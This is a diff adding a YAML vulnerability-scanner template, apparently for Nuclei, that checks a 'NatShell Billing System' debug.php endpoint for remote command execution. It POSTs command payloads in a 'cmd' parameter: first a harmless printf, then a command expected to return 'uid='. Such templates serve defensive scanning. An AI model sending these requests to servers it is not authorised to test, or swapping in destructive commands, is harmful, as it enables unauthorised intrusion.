@@ -1,0 +1,43 @@
+id: natshell-billing-system-debug-rce
+
+info:
+  name: NatShell Billing System Debug RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    NatShell Billing System has a debug.php script that allows the execution of arbitrary commands, leading to remote command execution on the server.
+  reference:
+    - https://mp.weixin.qq.com/s/CVe7GSRzCKcYXj5Pj8W5SA
+
+variables:
+  rand1: "{{rand_int(40000, 44800)}}"
+  rand2: "{{rand_int(40000, 44800)}}"
+  cmd_payload: "printf {{rand1}}%%%{{rand2}}"
+
+http:
+  - raw:
+      - |
+        POST /debug.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        cmd={{cmd_payload}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{rand1}}%{{rand2}}"
+  - raw:
+      - |
+        POST /debug.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        cmd={{cmd}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "uid="
